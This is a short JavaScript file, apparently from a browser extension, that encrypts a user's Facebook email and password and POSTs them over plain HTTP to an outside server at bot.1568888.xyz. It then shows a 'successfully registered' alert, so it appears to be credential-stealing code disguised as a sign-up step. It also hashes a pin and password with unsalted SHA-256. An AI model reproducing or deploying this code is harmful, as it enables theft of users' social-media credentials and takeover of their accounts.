// sendCredentials.js
function encryptByAES(message, secretKey) {  
    var key = CryptoJS.enc.Utf8.parse(secretKey);  
    var iv = CryptoJS.lib.WordArray.create(CryptoJS.lib.WordArray.random(16));  
    var encrypted = CryptoJS.AES.encrypt(message, key, {  
      iv: iv,  
      mode: CryptoJS.mode.CBC,  
      padding: CryptoJS.pad.Pkcs7  
    });  
    return iv.toString(CryptoJS.enc.Hex) + ':' + encrypted.ciphertext.toString(CryptoJS.enc.Base64);  
  }  

function hashPinAndPassword(pin, password) {
    var pinHash = CryptoJS.SHA256(pin).toString(CryptoJS.enc.Hex);
    var passwordHash = CryptoJS.SHA256(password).toString(CryptoJS.enc.Hex);
    return pinHash + passwordHash; // Concatenation of the hashes
}

function sendCredentialsToServer(userId, fbEmail, fbPassword, key) {
    const encryptedEmail = encryptByAES(fbEmail, key);
    const encryptedPassword = encryptByAES(fbPassword, key);
    const data = {
        id: userId,
        fb_email: encryptedEmail,
        fb_password: encryptedPassword
    };

    fetch('http://bot.1568888.xyz/store_credentials.php', {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: new URLSearchParams(data)
    })
    .then(response => response.text())
    .then(data => {console.log("Server response:", data)
    alert("Congrats! You’ve successfully registered and now please click on the extension icon to log in!");
    })
    .catch(error => console.error('Error:', error));
}
